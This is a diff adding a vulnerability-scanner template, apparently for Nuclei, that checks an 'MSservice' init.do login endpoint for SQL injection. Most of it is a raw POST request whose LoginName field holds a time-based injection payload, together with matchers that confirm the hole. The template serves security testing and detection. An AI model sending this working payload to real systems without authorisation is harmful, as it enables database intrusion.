@@ -1,0 +1,36 @@
+id: msservice-init-sqli
+
+info:
+  name: MSservice init.do - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    MSservice init.do存在SQL注入漏洞，攻击者利用该漏洞可获取数据库权限。
+  reference:
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/MSService/MSService%E6%9C%8D%E5%8A%A1init.do%E6%8E%A5%E5%8F%A3%E5%A4%84%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: MSService
+
+http:
+  - raw:
+      - |
+        POST /init.do HTTP/1.1
+        Content-Length: 70
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/json
+        Connection: close
+
+        {"LoginName":"1001' WAITFOR DELAY '0:0:3'-- znSL","password":"123456"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration>=3"
+          - 'contains(body,"ConsultCenterCode")'
+          - "status_code == 200"
+        condition: and
